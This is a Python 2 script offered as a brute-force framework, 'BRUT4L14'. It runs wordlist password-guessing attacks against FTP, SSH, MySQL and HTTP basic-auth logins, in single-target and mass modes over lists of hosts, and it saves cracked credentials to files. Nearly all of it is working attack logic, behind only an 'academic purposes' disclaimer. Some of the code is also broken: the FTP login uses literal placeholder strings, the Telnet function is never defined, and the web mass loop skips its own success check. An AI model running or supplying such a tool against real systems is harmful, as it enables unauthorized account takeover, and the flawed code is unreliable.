# coding=utf-8

import os
import requests
import paramiko
import ftplib
import mysql.connector
from mysql.connector import errorcode


#SYSTEM FUNCTIONS
def banner():
    print ('''
██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗██╗     ██╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║  ██║██║    ███║██║  ██║
██████╔╝██████╔╝██║   ██║   ██║   ███████║██║    ╚██║███████║
██╔══██╗██╔══██╗██║   ██║   ██║   ╚════██║██║     ██║╚════██║
██████╔╝██║  ██║╚██████╔╝   ██║        ██║███████╗██║     ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝        ╚═╝╚══════╝╚═╝     ╚═╝
    ''')
    print "-"*62
    print "Author: G4mbl3r"
    print "Content: Framework to execute Brute Force in various services"
    print "Tool created for academic purposes"
    print "I'm not responsible for any use that can be given to tool"
    print '-'*62
    print
def menu():
    os.system('clear')
    banner()
    print "[+] - BRUT4L14 BRUTE FORCE FRAMEWORK - [+]"
    print
    print "[1] - FTP BRUTE FORCE"
    print "[2] - SSH BRUTE FORCE"
    print "[3] - TELNET BRUTE FORCE"
    print "[4] - MYSQL BRUTE FORCE"
    print "[5] - WEB SIMPLE AUTH BRUTE FORCE"
    print "[0] - EXIT"
    menu_option_validation()
def menu_option_validation():
    print
    option = raw_input("[+] - Select one option[0-5]:")
    print
    if option == '0':
        os.system('clear')
        exit()
    elif option == '1':
        os.system('clear')
        brute_ftp()
    elif option == '2':
        os.system('clear')
        brute_ssh()
    elif option == '3':
        os.system('clear')
        brute_telnet()
    elif option == '4':
        os.system('clear')
        brute_mysql()
    elif option == '5':
        os.system('clear')
        brute_wsa()
    else:
        os.system('clear')
        print "[!] - Please input a valid option"
        print
        menu()
def load_lists():
    user_file = raw_input('[+] - Please provide the file with the username(s): ')
    pass_file = raw_input('[+] - Please provide the file with the passwords: ')
    try:
        user_list = open('wordlists/'+user_file,'r')
        pass_list = open('wordlists/'+pass_file,'r')
        username = user_list.read().splitlines()
        password = pass_list.read().splitlines()
        return username,password
    except:
        raw_input("[!] - Error to open the files, you probaly provide the wrong path")
        load_lists()
def load_targets():
    try:
        ips_file_name = raw_input('[+] - Please provide the file with the targets to attack: ')
        ips = open('wordlists/'+ips_file_name,'r')
        ipfile = ips.read().splitlines()
        return ipfile
    except:
        raw_input("[!] - Error to open the files, you probaly provide the wrong path")
        load_targets()
def back():
    r = raw_input('Process Done! Back to menu(y/n):')
    if r == 'y' or r == 'Y':
        menu()
    elif r == 'n' or r == 'N':
        os.system('clear')
        exit()
    else:
        os.system('clear')
        print '[!] - Please input a valid option'
        back()

#BRUTE FORCE FTP
def brute_ftp():
    print "[+] - FTP BRUTE FORCE - [+]"
    print '[1] - SINGLE ATTACK'
    print '[2] - MASS ATTACK'
    print '[0] - MENU'
    print
    brute_ftp_option_validation()
def brute_ftp_option_validation():
    option = raw_input('Select one option[0-2]: ')
    if option == '1':
        os.system('clear')
        brute_ftp_single()
    elif option == '2':
        os.system('clear')
        brute_ftp_mass()
    elif option == '0':
        menu()
    else:
        os.system('clear')
        print '[!] - Please input a valid option'
        brute_ftp()
def brute_ftp_single():
    port = 21
    users, passwords = load_lists()
    target = raw_input('[+] - Please provide the target to attack: ')
    port = raw_input("[+] - Please privde the port[Press Enter to use 21]: ")
    for user in users:
        for password in passwords:
            print
            print '[+] - User: '+user
            print '[+] - Password: '+password
            print '[+] - Target: '+target
            try:
                server = ftplib.FTP(target,port)
                server.login('user','password')
                server.dir()
                print "[+] - Credencials founded"
                break
            except ftplib.error_perm:
                print "[!] - Authentication Error"
    back()
def brute_ftp_mass():
    port = 21
    users, passwords = load_lists()
    targets = load_targets
    port = raw_input("[+] - Please privde the port[Press Enter to use 21]: ")
    for user in users:
        for password in passwords:
            for target in targets:
                print
                print '[+] - User: '+user
                print '[+] - Password: '+password
                print '[+] - Target: '+target
                try:
                    server = ftplib.FTP(target,port)
                    server.login('user','password')
                    server.dir()
                    print "[+] - Credencials founded"
                    response = open('results/SSH_ATTACK_RESULT_'+target+'.txt','w')
                    response.write(target+','+user+','+password)
                    response.close()
                    break
                except ftplib.error_perm:
                    print "[!] - Authentication Error"
    back()

#BRUTE FORCE SSH
def brute_ssh():
    print "[+] - SSH BRUTE FORCE - [+]"
    print '[1] - SINGLE ATTACK'
    print '[2] - MASS ATTACK'
    print '[0] - MENU'
    print
    brute_ssh_option_validation()
def brute_ssh_option_validation():
    option = raw_input('Select one option[0-2]: ')
    if option == '1':
        os.system('clear')
        brute_ssh_single()
    elif option == '2':
        os.system('clear')
        brute_ssh_mass()
    elif option == '0':
        menu()
    else:
        os.system('clear')
        print '[!] - Please input a valid option'
        brute_ftp()
def brute_ssh_single():
    port = 22
    users, passwords = load_lists()
    ip = raw_input('[+] - Please provide the target to attack: ')
    port = raw_input("[+] - Please privde the port[Press Enter to use 22]: ")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in users:
        for password in passwords:
            print
            print '[+] - User: '+user
            print '[+] - Password: '+password
            print '[+] - Target: '+ip
            try:
                ssh.connect(ip, username=user,password=password,port=port)
                print "[+] - Credencials founded"
                break
            except paramiko.ssh_exception.AuthenticationException:
                print "[!] - Authentication Error"
    back()
def brute_ssh_mass():
    port = 22
    users, passwords = load_lists()
    ips = load_targets()
    port = raw_input("[+] - Please privde the port[Press Enter to use 22]: ")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in users:
        for password in passwords:
            for ip in ips:
                print
                print '[+] - User: '+user
                print '[+] - Password: '+password
                print '[+] - Target: '+ip
                try:
                    ssh.connect(ip, username=user,password=password,port=port)
                    print "[+] - Credencials founded"
                    response = open('results/SSH_ATTACK_RESULT_'+ip+'.txt','w')
                    response.write(ip+','+user+','+password)
                    response.close()
                    break
                except paramiko.ssh_exception.AuthenticationException:
                    print "[!] - Authentication Error"
                except:
                    print "[!] - Error"
    back()

#BRUTE FORCE WEB BASIC AUTH
def brute_wsa():
    print "[+] - WEB BASIC AUTH BRUTE FORCE - [+]"
    print '[1] - SINGLE ATTACK'
    print '[2] - MASS ATTACK'
    print '[0] - MENU'
    print
    brute_wsa_option_validation()
def brute_wsa_option_validation():
    option = raw_input('Select one option[0-2]: ')
    if option == '1':
        os.system('clear')
        brute_wsa_single()
    elif option == '2':
        os.system('clear')
        brute_wsa_mass()
    elif option == '0':
        menu()
    else:
        os.system('clear')
        print '[!] - Please input a valid option'
        brute_wsa()
def brute_wsa_single():
    print "[+] - WEB BASIC AUTH BRUTE FORCE  - [+]"
    users, passwords = load_lists()
    ip = raw_input('[+] - Please provide the taget to attack: ')
    for user in users:
        for password in passwords:
            r = requests.get('http://'+ip, auth=(user, password))
            resp = r.status_code
            print '[+] - HTTP Response ',resp
            print '[+] - Executing brute force - [+]'
            print '[+] - User: '+user
            print '[+] - Password: '+password
            print '[+] - Target: http://'+ip
            if resp == 200:
                print
                print '[+] - LOGIN FOUNDED'
                print '[+] - HTTP Response ',resp
                print '[+] - User: '+user
                print '[+] - Password: '+password
                print '[+] - Target: http://'+ip
                print
                break
    back()
def brute_wsa_mass():
    print "[+] - WEB BASIC AUTH BRUTE FORCE  - [+]"
    users,passwords = load_lists()
    ipfile = load_targets()
    for user in users:
        for password in passwords:
            for ip in ipfile:
                r = requests.get('http://'+ip, auth=(user, password))
                resp = r.status_code
                print '[+] - HTTP Response ',resp
                print '[+] - Executing brute force - [+]'
                print '[+] - User: '+user
                print '[+] - Password: '+password
                print '[+] - Target: http://'+ip
                print
                continue
                if resp == 200:
                    print
                    print '[+] - LOGIN FOUNDED'
                    print '[+] - HTTP Response ',resp
                    print '[+] - User: '+user
                    print '[+] - Password: '+password
                    print '[+] - Target: http://'+ip
                    print
                    response = open('results/WBA_ATTACK_RESULT.txt','w')
                    response.write(ip+','+user+','+password)
                    response.close()
    back()

#BRUTE FORCE MYSQL
def brute_mysql():
    print "[+] - MYSQL BRUTE FORCE - [+]"
    print '[1] - SINGLE ATTACK'
    print '[2] - MASS ATTACK'
    print '[0] - MENU'
    print
    brute_mysql_option_validation()
def brute_mysql_option_validation():
    option = raw_input('Select one option[0-2]: ')
    if option == '1':
        os.system('clear')
        brute_mysql_single()
    elif option == '0':
        menu()
    else:
        os.system('clear')
        print '[!] - Please input a valid option'
        brute_mysql()
def brute_mysql_single():
    port = 3306
    users, passwords = load_lists()
    target = raw_input('[+] - Please provide the target to attack: ')
    port = raw_input("[+] - Please provide the port[Press Enter to use 3306]: ")
    database = raw_input("[+] - Please provide the database: ")
    for user in users:
        for password in passwords:
            print
            print '[+] - User: '+user
            print '[+] - Password: '+password
            print '[+] - Target: '+target
            try:
                cnx = connection.MySQLConnection(user=user, password=password,host=target,port=port,database=database)
                print "[+] - Credencials founded"
            except mysql.connector.Error as err:
                if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
                    print("!] - Authentication Error")
                elif err.errno == errorcode.ER_BAD_DB_ERROR:
                    print("Database does not exist")
                else:
                    print(err)
    back()

#PROGRAM START
menu()
